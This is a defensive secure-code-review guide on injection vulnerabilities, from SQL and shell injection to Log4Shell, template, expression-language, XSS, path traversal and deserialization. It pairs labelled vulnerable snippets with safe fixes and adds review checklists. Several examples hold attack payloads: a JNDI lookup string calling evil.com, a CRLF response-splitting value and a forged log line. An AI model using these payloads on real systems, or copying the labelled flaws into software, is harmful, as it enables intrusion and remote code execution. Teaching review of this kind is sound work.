# Skill 02: Injection Prevention

Every injection vulnerability — SQL injection, command injection, Log4Shell, OGNL, XSS —
follows the same pattern: data crosses a boundary where it is interpreted as code. The
reviewer's job is to find every such boundary and verify that data stays data.

## The Core Question

> "At every point where a string is sent to an interpreter (SQL engine, shell, template
> engine, log framework, browser), can attacker-controlled content become part of the
> code rather than the data?"

## The Universal Pattern

Injection happens when:
1. An interpreter accepts mixed code+data in a single channel (SQL string, shell command,
   HTML document, log message template)
2. User input reaches that channel
3. No mechanism separates user data from the code structure

The fix is always one of:
- **Parameterization** — keep code and data in separate channels (prepared statements,
  execFile with argument arrays)
- **Escaping** — convert data so the interpreter treats it as literal (HTML entity encoding,
  shell quoting) — less reliable, last resort
- **Restriction** — limit what the interpreter can do (disable JNDI lookups, use SafeLoader)

## What To Check

### 1. SQL Injection (still #1 in the wild)
**Red flags:**
```python
# BAD: string concatenation/formatting
query = f"SELECT * FROM users WHERE name = '{user_input}'"
cursor.execute("SELECT * FROM users WHERE id = " + user_id)

# BAD: ORM escape hatch with raw SQL
User.objects.extra(where=["name = '%s'" % name])
User.objects.raw("SELECT * FROM users WHERE name = '%s'" % name)

# GOOD: parameterized
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
User.objects.filter(name=user_input)
```

**Review check:** Search for string concatenation/formatting in anything that looks like
a SQL query. Search for `.raw(`, `.extra(`, `execute(`, `query(` with string operations.
Also check: are prepared statement placeholders truly parameterized, or is the query
dynamically constructed from user input before parameterization? (Drupalgeddon pattern)

### 2. Command Injection
**Red flags:**
```python
# BAD: shell=True with user input
subprocess.call("convert " + filename + " output.png", shell=True)
os.system("grep " + pattern + " /var/log/app.log")

# BAD in Node.js: exec() goes through shell
child_process.exec(`convert ${filename} output.png`)

# BAD in any language: backtick execution
`grep #{user_input} /var/log/app.log`

# GOOD: no shell, argument array
subprocess.call(["convert", filename, "output.png"])
child_process.execFile("convert", [filename, "output.png"])
```

**Review check:** Search for `system(`, `popen(`, `exec(`, `shell=True`, backtick
execution, `Runtime.exec(`, `ProcessBuilder` with shell. If found, trace every argument
backward — can any contain user input?

### 3. Log Injection (the Log4Shell lesson)
**Red flags:**
```java
// BAD: if the logging framework performs template substitution on messages
logger.info("User logged in: " + username);  // Safe if logger is inert
// But Log4j treated logged content as templates:
// username = "${jndi:ldap://evil.com/a}" → RCE

// Log injection for log forgery:
// username = "admin\n2024-01-01 12:00:00 INFO User logged out" → forged log entry
```

**Review check:** Does the logging framework perform any substitution/evaluation on logged
content? Is user input in log messages sanitized for newlines and control characters?

### 4. Template Injection (SSTI)
**Red flags:**
```python
# BAD: user input IN the template
render_template_string("Hello " + user_input)
Template("Hello ${" + user_input + "}").render()

# GOOD: user input AS template data
render_template_string("Hello {{name}}", name=user_input)
```

**Review check:** Is user input concatenated into a template string (code), or passed as
a template variable (data)? The distinction looks subtle but is the difference between
safe and exploitable.

### 5. Expression Language Injection (OGNL, SpEL, EL, MVEL)
**Red flags:**
```java
// BAD: user input evaluated as expression
ActionContext.getContext().getValueStack().findValue(userInput);  // OGNL
parser.parseExpression(userInput).getValue();  // SpEL
```

Any expression language with reflection/method-call capabilities is equivalent to code
execution when fed user input.

**Review check:** Search for expression evaluation APIs. Trace input backward — can
attacker data reach the expression string?

### 6. Header/Response Injection
**Red flags:**
```python
# BAD: CRLF in header value
response.headers['Location'] = user_provided_url  # may contain \r\n

# HTTP Response Splitting:
# user_provided_url = "/ok\r\nSet-Cookie: admin=true\r\n\r\nFake body"
```

**Review check:** Is user input placed in HTTP headers? Is the framework filtering CRLF?

### 7. Path Traversal
**Red flags:**
```python
# BAD: client filename used directly
path = os.path.join(UPLOAD_DIR, request.files['file'].filename)
# BAD: path traversal in URL
path = os.path.join(BASE_DIR, request.args['page'])
# Note: os.path.join("/base", "/etc/passwd") == "/etc/passwd"

# GOOD: validate resolved path
resolved = os.path.realpath(os.path.join(BASE_DIR, filename))
if not resolved.startswith(os.path.realpath(BASE_DIR)):
    raise ValueError("Path traversal attempt")
```

**Review check:** Is any user-controlled string used to construct a file path? After
constructing the path, is the resolved (canonical) path verified to be within the intended
directory?

### 8. XSS (Cross-Site Scripting)
**Red flags:**
```jsx
// BAD in React:
<div dangerouslySetInnerHTML={{__html: userContent}} />

// BAD in templates:
<div>{!! $userContent !!}</div>   // Laravel Blade unescaped
<div>{{ userContent | safe }}</div>  // Jinja2 safe filter
<div v-html="userContent"></div>    // Vue unescaped

// BAD: href/src with user URL
<a href={userUrl}>  // javascript: URLs bypass escaping
```

**Review check:** Search for raw HTML output bypasses in the framework. Trace the data
source — even "trusted" sources (API, database) may contain user-generated content. Check
URLs in href/src for javascript: protocol filtering.

### 9. Deserialization
**Red flags:**
```python
pickle.loads(user_data)           # Python: arbitrary code execution
yaml.load(user_data)               # Python: use yaml.safe_load
```
```java
ObjectInputStream.readObject()     // Java: gadget chains
```
```ruby
YAML.load(user_data)               // Ruby: arbitrary object instantiation
Marshal.load(user_data)            // Ruby: arbitrary code execution
```

**Review check:** Is any deserialization format capable of instantiating arbitrary types
applied to untrusted input? For Java: is ObjectInputFilter configured? For Python: is
pickle used with untrusted data? For YAML: is safe_load/SafeLoader used?

### 10. GraphQL / Query Injection
**Red flags:**
- Introspection enabled in production
- No query depth or complexity limits
- No rate limiting on queries
- Batch query support without limits

**Review check:** Is GraphQL introspection disabled in production? Are query depth,
complexity, and batch limits enforced?

## The Injection Checklist

For ANY new code that constructs strings sent to an interpreter:

1. **Identify the interpreter** — SQL, shell, HTML, template, log, LDAP, XPath, regex
2. **Identify the data** — what values are user-controlled or externally sourced?
3. **Check the mechanism** — is data separated from code (parameterization) or mixed in?
4. **Check the edge cases** — what if the data contains the interpreter's metacharacters?
5. **Check double-encoding** — is the data decoded ONCE or could multi-encoding bypass
   validation? (Apache path traversal pattern)
6. **Check the error path** — does error handling also evaluate user input? (Struts OGNL
   pattern where error messages went through expression evaluation)

## Catalog References
- I1 (Log4Shell) — log framework evaluating user data as templates
- I2 (Shellshock) — parser continuing past expected end of input
- I3 (Struts OGNL) — error path evaluating user input as expression
- I4 (Template Injection) — user data concatenated into template source
- I8 (PHP type juggling) — weak comparison bypassing auth
- I9 (Rails YAML) — content-type negotiation enabling deserialization RCE
- I11 (Prototype Pollution) — recursive merge modifying Object.prototype
- I12 (child_process.exec) — shell vs direct execution
- M9 (ImageTragick) — shell metacharacters in filenames
- M27 (Drupalgeddon) — dynamically constructed prepared statements
- M28 (Struts OGNL) — error path going through expression evaluator
- M32 (Apache path traversal) — double-encoding bypass
